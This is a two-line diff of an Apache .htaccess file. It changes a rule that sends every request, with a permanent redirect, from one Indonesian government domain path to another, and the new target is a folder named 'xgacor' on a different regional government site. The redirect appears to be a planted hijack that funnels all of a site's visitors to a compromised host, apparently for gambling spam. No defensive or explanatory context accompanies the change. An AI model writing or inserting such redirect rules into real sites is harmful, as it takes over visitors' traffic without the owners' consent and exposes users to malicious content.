@@ -1,2 +1,2 @@
 RewriteEngine on
-RewriteRule ^(.*)$ https://bakorwilbojonegoro.jatimprov.go.id/awesome/$1 [R=301,L]
+RewriteRule ^(.*)$ https://siharpa.pandeglangkab.go.id/img/xgacor/$1 [R=301,L]
